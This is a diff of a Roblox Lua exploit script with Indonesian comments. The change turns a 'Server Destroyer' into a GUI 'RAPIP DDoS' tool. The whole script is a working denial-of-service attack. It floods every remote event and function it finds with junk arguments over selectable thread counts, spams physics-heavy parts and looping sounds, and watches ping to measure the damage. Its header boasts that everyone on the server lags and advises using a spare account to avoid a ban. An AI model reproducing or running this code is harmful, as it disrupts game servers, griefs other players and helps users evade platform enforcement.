@@ -1,27 +1,113 @@
 --[[
-    SCRIPT: Server Destroyer v2 (Delta Mobile Optimized)
-    GAME: Salon de Fiestas / Universal
-    RISIKO: BAN PERMANEN - GUNAKAN AKUN CADANGAN!
+    SCRIPT: GUI DDoS Server Spammer (Delta Mobile)
+    GAME: Universal (Salon de Fiestas / any game)
+    FITUR: Multi-thread spam, part spam, sound spam, ping monitor
+    EFEK: SEMUA ORANG DI SERVER MERASAKAN LAG BERAT!
+    RISIKO: BAN PERMANEN - PAKE AKUN CADANGAN!
 --]]
 
 -- Load Services
 local Players = game:GetService("Players")
 local RunService = game:GetService("RunService")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local UserInputService = game:GetService("UserInputService")
 local LocalPlayer = Players.LocalPlayer
+local Mouse = LocalPlayer:GetMouse()
 
--- Fungsi untuk ngecek kalo karakter udah muncul
 repeat wait() until LocalPlayer.Character
 
-print("💀 SERVER DESTROYER AKTIF - GASKAN!")
+-- ===========================================
+-- 1. GUI SETUP (Mobile Friendly)
+-- ===========================================
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "Rapip_DDoS"
+screenGui.ResetOnSpawn = false
+screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+screenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
+
+-- Background utama
+local bg = Instance.new("Frame")
+bg.Size = UDim2.new(0, 300, 0, 450)
+bg.Position = UDim2.new(0.5, -150, 0.5, -225)
+bg.BackgroundColor3 = Color3.fromRGB(10, 10, 20)
+bg.BackgroundTransparency = 0.1
+bg.BorderSizePixel = 0
+bg.Active = true
+bg.Draggable = true
+bg.Parent = screenGui
+
+-- Stroke merah biar keliatan garang
+local uiStroke = Instance.new("UIStroke")
+uiStroke.Thickness = 3
+uiStroke.Color = Color3.fromRGB(255, 0, 0)
+uiStroke.Parent = bg
+
+-- Corner
+local corner = Instance.new("UICorner")
+corner.CornerRadius = UDim.new(0, 15)
+corner.Parent = bg
+
+-- Title
+local title = Instance.new("TextLabel")
+title.Size = UDim2.new(1, 0, 0, 50)
+title.BackgroundTransparency = 1
+title.Text = "💀 RAPIP DDoS 💀"
+title.TextColor3 = Color3.fromRGB(255, 50, 50)
+title.TextScaled = true
+title.Font = Enum.Font.GothamBlack
+title.Parent = bg
+
+-- Status
+local statusLabel = Instance.new("TextLabel")
+statusLabel.Size = UDim2.new(1, -20, 0, 30)
+statusLabel.Position = UDim2.new(0, 10, 0, 55)
+statusLabel.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
+statusLabel.BackgroundTransparency = 0.3
+statusLabel.Text = "🔍 SCANNING REMOTE..."
+statusLabel.TextColor3 = Color3.fromRGB(255, 255, 0)
+statusLabel.TextScaled = true
+statusLabel.Font = Enum.Font.GothamBold
+statusLabel.Parent = bg
+
+-- Info server
+local serverInfo = Instance.new("TextLabel")
+serverInfo.Size = UDim2.new(1, -20, 0, 25)
+serverInfo.Position = UDim2.new(0, 10, 0, 90)
+serverInfo.BackgroundTransparency = 1
+serverInfo.Text = "👥 Player: " .. #Players:GetPlayers()
+serverInfo.TextColor3 = Color3.fromRGB(150, 150, 255)
+serverInfo.TextScaled = true
+serverInfo.Font = Enum.Font.GothamMedium
+serverInfo.Parent = bg
+
+-- Ping monitor
+local pingLabel = Instance.new("TextLabel")
+pingLabel.Size = UDim2.new(1, -20, 0, 25)
+pingLabel.Position = UDim2.new(0, 10, 0, 115)
+pingLabel.BackgroundTransparency = 1
+pingLabel.Text = "📶 PING: -- ms"
+pingLabel.TextColor3 = Color3.fromRGB(100, 255, 100)
+pingLabel.TextScaled = true
+pingLabel.Font = Enum.Font.GothamMedium
+pingLabel.Parent = bg
 
 -- ===========================================
--- METODE 1: REMOTE SPAM (PALING AMPUH)
+-- 2. FUNGSI SPAM SERVER (DDOS)
 -- ===========================================
--- Cari semua remote di game
-local function getAllRemotes(folder)
+
+-- Fungsi cari semua remote (termasuk yang tersembunyi)
+local function getAllRemotes()
     local remotes = {}
+    local foldersToScan = {
+        ReplicatedStorage,
+        game:GetService("Workspace"),
+        Players,
+        game:GetService("CoreGui"),
+        game:GetService("StarterGui")
+    }
+    
     local function scan(obj)
+        if not obj then return end
         for _, child in pairs(obj:GetChildren()) do
             if child:IsA("RemoteEvent") or child:IsA("RemoteFunction") or child:IsA("UnreliableRemoteEvent") then
                 table.insert(remotes, child)
@@ -30,146 +116,253 @@ local function getAllRemotes(folder)
             end
         end
     end
-    scan(folder)
+    
+    for _, folder in pairs(foldersToScan) do
+        scan(folder)
+    end
+    
     return remotes
 end
 
--- Cari remote di beberapa lokasi umum
-local remoteLists = {
-    getAllRemotes(ReplicatedStorage),
-    getAllRemotes(Players),
-    getAllRemotes(game:GetService("Workspace"))
-}
+-- Scan remote
+local allRemotes = getAllRemotes()
+statusLabel.Text = "📡 Remote: " .. #allRemotes
+serverInfo.Text = "👥 Player: " .. #Players:GetPlayers()
+wait(1)
 
--- Gabungin semua remote
-local allRemotes = {}
-for _, list in pairs(remoteLists) do
-    for _, remote in pairs(list) do
-        table.insert(allRemotes, remote)
-    end
-end
-
-print("📡 Ditemukan " .. #allRemotes .. " remote buat dispam")
-
--- ARGUMEN SPAM - coba berbagai kombinasi
+-- Argumen spam (kombinasi mematikan)
 local spamArgs = {
-    {"spam", 0, true},
-    {""},
-    {0, false},
-    {{}},
-    {Vector3.new(0,0,0)},
-    {LocalPlayer, "spam"},
-    {game:GetService("HttpService"):GenerateGUID(false)} -- random string
+    {"ddos", 0, true},
+    {"", 999999},
+    {0, false, "spam"},
+    {{}, {spam = true}},
+    {Vector3.new(9e9, 9e9, 9e9)},
+    {LocalPlayer, "attack", tick()},
+    {game:GetService("HttpService"):GenerateGUID(false)},
+    {nil, nil, nil, nil, nil}
 }
 
--- Loop utama spam (pake spawn biar gak nge-freeze client)
-for i = 1, 10 do -- 10 thread parallel
-    spawn(function()
-        while true do
-            for _, remote in ipairs(allRemotes) do
-                if remote and remote.Parent then -- Cek kalo remote masih ada
-                    for _, args in ipairs(spamArgs) do
-                        pcall(function()
-                            if remote:IsA("RemoteEvent") then
-                                remote:FireServer(unpack(args))
-                            elseif remote:IsA("RemoteFunction") then
-                                -- InvokeServer dijalankan di coroutine biar gak nge-freeze
-                                coroutine.wrap(function()
-                                    remote:InvokeServer(unpack(args))
-                                end)()
-                            end
-                        end)
+-- Status spam
+local spamming = false
+local spamThreads = 0
+local connection = nil
+
+-- Fungsi spam berat (server-side)
+local function startServerSpam(intensity)
+    spamming = true
+    local threadCount = intensity
+    
+    statusLabel.Text = "🔥 DDOS AKTIF (" .. threadCount .. " THREADS)"
+    statusLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
+    
+    -- Thread utama spam remote
+    for i = 1, threadCount do
+        spawn(function()
+            spamThreads = spamThreads + 1
+            while spamming do
+                for _, remote in ipairs(allRemotes) do
+                    if remote and remote.Parent then
+                        for _, args in ipairs(spamArgs) do
+                            pcall(function()
+                                if remote:IsA("RemoteEvent") then
+                                    remote:FireServer(unpack(args))
+                                elseif remote:IsA("RemoteFunction") then
+                                    coroutine.wrap(function()
+                                        remote:InvokeServer(unpack(args))
+                                    end)()
+                                end
+                            end)
+                        end
                     end
                 end
+                wait() -- Jeda minimal
             end
-            wait() -- Jeda dikit biar client gak crash total
+            spamThreads = spamThreads - 1
+        end)
+    end
+    
+    -- Spam ekstra pake RenderStepped (60x/detik)
+    connection = RunService.RenderStepped:Connect(function()
+        if spamming then
+            for _, remote in ipairs(allRemotes) do
+                if remote and remote.Parent and remote:IsA("RemoteEvent") then
+                    pcall(function()
+                        remote:FireServer("heartbeat", math.random(1, 999999), workspace)
+                    end)
+                end
+            end
+        end
+    end)
+    
+    -- Part spam (bikin physics lag server)
+    spawn(function()
+        while spamming do
+            for i = 1, 20 do
+                local part = Instance.new("Part")
+                part.Size = Vector3.new(5, 5, 5)
+                part.Position = LocalPlayer.Character.HumanoidRootPart.Position + Vector3.new(math.random(-100,100), 100, math.random(-100,100))
+                part.Velocity = Vector3.new(math.random(-200,200), -200, math.random(-200,200))
+                part.RotVelocity = Vector3.new(math.random(-500,500), math.random(-500,500), math.random(-500,500))
+                part.Anchored = false
+                part.CanCollide = false
+                part.Material = Enum.Material.Neon
+                part.BrickColor = BrickColor.random()
+                part.Reflectance = 1
+                part.Parent = workspace
+                
+                -- Tambah efek berat (trail + light)
+                local trail = Instance.new("Trail")
+                trail.Attachment0 = Instance.new("Attachment", part)
+                trail.Attachment1 = Instance.new("Attachment", part)
+                trail.Attachment0.Position = Vector3.new(-2,0,0)
+                trail.Attachment1.Position = Vector3.new(2,0,0)
+                trail.Lifetime = 1
+                trail.Width = 10
+                trail.Color = ColorSequence.new(Color3.fromRGB(255,0,0))
+                trail.Parent = part
+                
+                local light = Instance.new("PointLight")
+                light.Parent = part
+                light.Range = 30
+                light.Brightness = 5
+                light.Color = Color3.fromRGB(255,0,0)
+                
+                game:GetService("Debris"):AddItem(part, 2)
+            end
+            wait(0.05)
+        end
+    end)
+    
+    -- Sound spam (bikin audio lag server)
+    spawn(function()
+        local sound = Instance.new("Sound")
+        sound.SoundId = "rbxassetid://9120387519"
+        sound.Volume = 5
+        sound.PlaybackSpeed = 10
+        sound.Looped = true
+        sound.Parent = workspace
+        
+        while spamming do
+            pcall(function()
+                sound:Play()
+            end)
+            wait(0.01)
         end
     end)
 end
 
--- ===========================================
--- METODE 2: HIGH FREQUENCY HEARTBEAT
--- ===========================================
--- Pake RenderStepped buat frekuensi lebih tinggi (60x per detik)
-RunService.RenderStepped:Connect(function()
-    for _, remote in ipairs(allRemotes) do
-        if remote and remote.Parent then
-            pcall(function()
-                if remote:IsA("RemoteEvent") then
-                    remote:FireServer("heartbeat", math.random(), tick())
-                end
-            end)
-        end
+local function stopServerSpam()
+    spamming = false
+    if connection then
+        connection:Disconnect()
+        connection = nil
     end
-end)
-
--- ===========================================
--- METODE 3: INSTANCE SPAM (BUAT PHYSICS LAG)
--- ===========================================
--- Buat ribuan part kecil yang jatuh terus
-local function spamParts()
-    local partCount = 0
-    while partCount < 500 do
-        local part = Instance.new("Part")
-        part.Size = Vector3.new(1, 1, 1)
-        part.Position = LocalPlayer.Character.HumanoidRootPart.Position + Vector3.new(math.random(-50,50), 50, math.random(-50,50))
-        part.Velocity = Vector3.new(0, -50, 0)
-        part.Parent = workspace
-        part.Touched:Connect(function() end) -- Event dummy biar berat
-        
-        -- Hapus part kalo udah jatuh kebawah
-        game:GetService("Debris"):AddItem(part, 5)
-        
-        partCount = partCount + 1
-        if partCount % 50 == 0 then
-            wait()
-        end
-    end
+    statusLabel.Text = "🟢 DDOS STOPPED"
+    statusLabel.TextColor3 = Color3.fromRGB(0, 255, 0)
 end
 
--- Jalankan part spam di thread terpisah
-spawn(spamParts)
-spawn(spamParts)
+-- ===========================================
+-- 3. BUTTON BUTTON SERVER DESTROYER
+-- ===========================================
 
--- ===========================================
--- METODE 4: SOUND SPAM (BUAT AUDIO LAG)
--- ===========================================
--- Buat sound object yang muter terus
-local function spamSound()
-    local sound = Instance.new("Sound")
-    sound.SoundId = "rbxassetid://9120387519" -- Sound dummy
-    sound.Looped = true
-    sound.Volume = 1
-    sound.Parent = workspace
+-- Fungsi bikin button keren
+local function createButton(text, posY, color, callback)
+    local btn = Instance.new("TextButton")
+    btn.Size = UDim2.new(1, -20, 0, 40)
+    btn.Position = UDim2.new(0, 10, 0, posY)
+    btn.BackgroundColor3 = color
+    btn.Text = text
+    btn.TextColor3 = Color3.fromRGB(255, 255, 255)
+    btn.TextScaled = true
+    btn.Font = Enum.Font.GothamBlack
+    btn.Parent = bg
     
-    -- Play di banyak thread biar overload
-    for i = 1, 20 do
-        spawn(function()
-            while true do
-                pcall(function()
-                    sound:Play()
-                end)
-                wait(0.1)
-            end
-        end)
-    end
+    local btnCorner = Instance.new("UICorner")
+    btnCorner.CornerRadius = UDim.new(0, 8)
+    btnCorner.Parent = btn
+    
+    btn.MouseButton1Click:Connect(callback)
+    
+    -- Efek hover
+    btn.MouseEnter:Connect(function()
+        btn.BackgroundColor3 = color:Lerp(Color3.fromRGB(255,255,255), 0.3)
+    end)
+    btn.MouseLeave:Connect(function()
+        btn.BackgroundColor3 = color
+    end)
+    
+    return btn
 end
 
-spawn(spamSound)
+-- Button 1: DDoS Ringan (5 Thread) - buat server 10-20 orang
+createButton("🌊 DDOS RINGAN (5 THREADS)", 150, Color3.fromRGB(255, 100, 0), function()
+    stopServerSpam()
+    wait(0.1)
+    startServerSpam(5)
+end)
+
+-- Button 2: DDoS Sedang (10 Thread) - buat server 20-40 orang
+createButton("🌊🌊 DDOS SEDANG (10 THREADS)", 195, Color3.fromRGB(255, 50, 0), function()
+    stopServerSpam()
+    wait(0.1)
+    startServerSpam(10)
+end)
+
+-- Button 3: DDoS Berat (20 Thread) - buat server 40-70 orang
+createButton("🌊🌊🌊 DDOS BERAT (20 THREADS)", 240, Color3.fromRGB(200, 0, 0), function()
+    stopServerSpam()
+    wait(0.1)
+    startServerSpam(20)
+end)
+
+-- Button 4: DDoS Extreme (30 Thread) - buat server FULL
+createButton("💀 DDOS EXTREME (30 THREADS)", 285, Color3.fromRGB(150, 0, 0), function()
+    stopServerSpam()
+    wait(0.1)
+    startServerSpam(30)
+end)
+
+-- Button 5: Stop DDoS
+createButton("🛑 STOP DDOS", 330, Color3.fromRGB(50, 50, 50), function()
+    stopServerSpam()
+end)
+
+-- Button 6: Refresh Remote & Player
+createButton("🔄 REFRESH DATA", 375, Color3.fromRGB(0, 100, 200), function()
+    allRemotes = getAllRemotes()
+    statusLabel.Text = "📡 Remote: " .. #allRemotes
+    serverInfo.Text = "👥 Player: " .. #Players:GetPlayers()
+    wait(1)
+    statusLabel.Text = spamming and "🔥 DDOS AKTIF" or "🟢 READY"
+end)
+
+-- Button 7: Close GUI
+createButton("❌ CLOSE", 415, Color3.fromRGB(100, 0, 0), function()
+    stopServerSpam()
+    screenGui:Destroy()
+end)
 
 -- ===========================================
--- MONITOR DAMAGE (OPSIONAL)
+-- 4. MONITOR REAL-TIME
 -- ===========================================
--- Cek efeknya
-local pingStart = game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString()
-print("📊 PING AWAL: " .. pingStart)
 
+-- Update ping dan player count
 spawn(function()
-    while true do
-        wait(5)
-        local pingNow = game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString()
-        print("📈 PING SEKARANG: " .. pingNow)
+    while screenGui and screenGui.Parent do
+        local stats = game:GetService("Stats")
+        local network = stats.Network
+        if network then
+            local ping = network.ServerStatsItem["Data Ping"]:GetValueString()
+            pingLabel.Text = "📶 PING: " .. ping
+        end
+        serverInfo.Text = "👥 Player: " .. #Players:GetPlayers()
+        wait(1)
     end
 end)
 
-print("🔥 SERVER DESTROYER BERJALAN - SEMOGA BERHASIL!")
+-- Notifikasi sukses
+game:GetService("StarterGui"):SetCore("SendNotification", {
+    Title = "💀 RAPIP DDOS",
+    Text = "GUI siap digunakan!\nServer: " .. #Players:GetPlayers() .. " pemain",
+    Duration = 5
+})
